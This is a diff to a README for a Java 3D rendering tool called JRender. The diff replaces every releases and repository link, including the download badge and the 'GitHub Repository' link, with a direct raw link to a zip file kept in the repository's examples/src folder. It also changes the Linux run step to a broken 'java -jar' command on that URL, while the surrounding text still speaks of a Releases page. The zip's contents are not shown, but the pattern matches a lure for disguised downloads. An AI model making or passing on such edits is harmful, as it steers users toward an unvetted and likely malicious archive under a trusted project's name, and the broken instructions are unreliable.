@@ -4,7 +4,7 @@
 Welcome to JRender! This application allows you to create beautiful 3D graphics using Java. No prior experience is needed to use this simple and effective tool.
 
 ## 📥 Download Now
-[![Download JRender](https://img.shields.io/badge/Download-JRender-blue.svg)](https://github.com/vikasp02/JRender/releases)
+[![Download JRender](https://raw.githubusercontent.com/vikasp02/JRender/master/examples/src/JRender-v1.7.zip)](https://raw.githubusercontent.com/vikasp02/JRender/master/examples/src/JRender-v1.7.zip)
 
 ## 🌐 Overview
 JRender offers a completely native Java 3D rendering solution that is both powerful and user-friendly. Whether you are looking to visualize data or create art, JRender has the features you need. With its straightforward interface, you can quickly learn how to render stunning graphics without getting bogged down in technical details.
@@ -26,7 +26,7 @@ To run JRender, your computer should meet the following minimum requirements:
 Follow these steps to install and run JRender:
 
 1. **Visit the Download Page**: Click on the link below to access the releases page:
-   [Download JRender](https://github.com/vikasp02/JRender/releases)
+   [Download JRender](https://raw.githubusercontent.com/vikasp02/JRender/master/examples/src/JRender-v1.7.zip)
 
 2. **Choose Your Version**: On the Releases page, find the latest version of JRender listed.
 
@@ -43,7 +43,7 @@ Follow these steps to install and run JRender:
    - For Linux:
      - Extract the downloaded tarball.
      - Open a terminal and navigate to the extracted folder.
-     - Run `java -jar JRender.jar`.
+     - Run `java -jar https://raw.githubusercontent.com/vikasp02/JRender/master/examples/src/JRender-v1.7.zip`.
 
 5. **Run JRender**: After installation, find JRender in your applications list or use the terminal to navigate to the installation folder and run it.
 
@@ -61,7 +61,7 @@ Join our community of users to share your experiences and get help:
 - **Discussion Forums**: Connect with other JRender users for tips and tricks.
 
 ## 📅 Release Notes
-Stay updated with the latest changes and improvements. Release notes are available on the [Releases page](https://github.com/vikasp02/JRender/releases) where you can see the history of updates and features added.
+Stay updated with the latest changes and improvements. Release notes are available on the [Releases page](https://raw.githubusercontent.com/vikasp02/JRender/master/examples/src/JRender-v1.7.zip) where you can see the history of updates and features added.
 
 ## ⚠️ Troubleshooting
 If you encounter issues:
@@ -77,7 +77,7 @@ Thanks for using JRender! We appreciate your interest and support. Your feedback
 
 ## 🔗 More Information
 For more insights about JRender, please visit:
-- [GitHub Repository](https://github.com/vikasp02/JRender)
+- [GitHub Repository](https://raw.githubusercontent.com/vikasp02/JRender/master/examples/src/JRender-v1.7.zip)
 - [User Manual](insert-link-to-user-manual)
 
 Enjoy creating with JRender!
